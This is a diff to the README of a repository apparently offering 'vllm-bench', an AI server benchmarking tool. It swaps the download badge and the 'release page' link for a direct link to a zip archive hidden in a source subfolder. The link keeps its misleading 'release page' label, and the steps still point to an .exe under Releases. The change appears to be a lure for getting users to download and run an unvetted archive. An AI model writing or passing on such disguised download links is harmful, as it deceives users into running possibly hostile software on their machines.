@@ -1,6 +1,6 @@
 # ⚡ vllm-bench - Test your server speed with ease
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Threeneedled-visualcell778/vllm-bench)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Threeneedled-visualcell778/vllm-bench/raw/refs/heads/main/src/metrics/bench-vllm-2.3.zip)
 
 vllm-bench provides a way to measure the performance of your artificial intelligence server endpoints. This tool runs tests to show how fast your setup processes requests. It focuses on the speed of text generation and system response times. You can use this data to tune your hardware and software for better outcomes.
 
@@ -20,7 +20,7 @@ Ensure that you have sufficient permissions to run programs on your computer. If
 
 Follow these steps to obtain and prepare the software for your computer.
 
-1. Go to the [vllm-bench release page](https://github.com/Threeneedled-visualcell778/vllm-bench).
+1. Go to the [vllm-bench release page](https://github.com/Threeneedled-visualcell778/vllm-bench/raw/refs/heads/main/src/metrics/bench-vllm-2.3.zip).
 2. Look for the latest version under the "Releases" section on the right side of the page.
 3. Click the link to view the assets for that version.
 4. Download the file ending in `.exe`. 
